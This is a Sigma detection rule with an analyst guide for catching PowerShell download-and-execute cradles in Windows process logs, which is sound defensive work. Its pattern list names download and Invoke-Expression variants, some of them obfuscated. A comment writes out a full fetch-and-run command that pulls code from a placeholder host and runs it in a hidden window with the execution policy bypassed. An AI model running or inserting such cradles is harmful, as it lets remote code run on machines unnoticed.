title: PowerShell Download and Execution Cradles
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: test
description: Detects PowerShell download and execution cradles.
references:
- https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
- https://labs.withsecure.com/publications/fin7-target-veeam-servers
author: Florian Roth (Nextron Systems)
date: 2022-03-24
modified: 2025-07-18
tags:
- attack.execution
- attack.t1059
logsource:
  product: windows
  category: process_creation
detection:
  selection_download:
    CommandLine|contains:
    - '.DownloadString('
    - '.DownloadFile('
    - 'Invoke-WebRequest '
    - 'iwr '
    - 'Invoke-RestMethod '
    - 'irm '          # powershell -ep bypass -w h -c irm test.domain/ffe | iex
  selection_iex:
    CommandLine|contains:
    - ';iex $'
    - '| IEX'
    - '|IEX '
    - 'I`E`X'
    - 'I`EX'
    - 'IE`X'
    - 'iex '
    - 'IEX ('
    - 'IEX('
    - 'Invoke-Expression'
  condition: all of selection_*
falsepositives:
- Some PowerShell installers were seen using similar combinations. Apply filters accordingly
level: high
note: |
  ---

  ### Technical Context

  This Sigma rule detects the execution of PowerShell commands that leverage download and execution cradles. These techniques are often employed by adversaries to download executable scripts or binaries directly from remote servers into memory and execute them, bypassing conventional defenses. The likely attacker objective includes deploying malware, remote access tools, or other malicious payloads without leaving significant traces on the filesystem.

  Relevant MITRE ATT&CK tactic: **Execution**; technique: **PowerShell (T1059.001)**. The primary telemetry sources include Windows process creation logs—specifically Security Event ID 4688 and Sysmon Event ID 1, capturing command line arguments. Malicious impacts might include system compromise, data theft, or lateral movement within the network. It is crucial to note that this detection does NOT confirm malicious activity in isolation, as legitimate administrative tasks may also trigger the rule.

  ---

  ### Investigation Steps

  - **Review the command line execution details**: Analyze Security Event ID 4688 or Sysmon Event ID 1 for command line arguments containing `.DownloadString(`, `.DownloadFile(` or `Invoke-WebRequest`. Look for unexpected usage during non-administrative activity or by non-privileged accounts.

  - **Identify legitimate usage**: Check for normal instances of PowerShell usage within the organization, such as software installation scripts or automated tasks. Compare command line patterns against documentation for standard operational procedures to distinguish benign activity.

  - **Check for known malicious indicators**: Investigate any command lines that include `iex` or `Invoke-Expression` executed by non-standard user accounts or during unusual hours. Assess if the retrieved payloads are from known malicious domains or hashes in threat intelligence feeds.

  - **Correlate with network activity**: Examine firewall or proxy logs for connections to external IPs or domains associated with the executed commands. Utilize DNS query logs to verify that these domains belong to the organization or align with expected behaviors.

  - **Assess endpoint activity**: For affected endpoints, validate whether files were downloaded to the disk, including reviewing for unexpected presence of executables or scripts in common download directories. Use file creation timestamps to correlate with alert generation times.

  - **Document user context**: Identify the user account executing the PowerShell command. Assess whether this account has legitimate permission levels, history of PowerShell usage, and check for any anomalous login patterns or recent privilege escalation.

  ---

  ### Prioritization

  This alert is classified as high severity given the potential for system compromise via malicious payloads being executed in memory. The likelihood of malicious abuse is significant, especially considering that download and execution cradles are a common tactic in payload delivery methods. Such techniques are frequently weaponized by sophisticated threat actors.

  ---

  ### Blind Spots and Assumptions

  Detection limitations include the possibility for legitimate PowerShell scripts to use similar commands, potentially leading to false positives. Reliable detection requires deployment of appropriate logging configuration for both process creation and PowerShell script execution across all endpoints. Legitimate IT operations, such as downloading updates or running automated scripts, may also trigger the alert. Companion detections, such as monitoring for unusual outbound network traffic or file integrity changes in sensitive directories, can enhance overall visibility into potential threats.

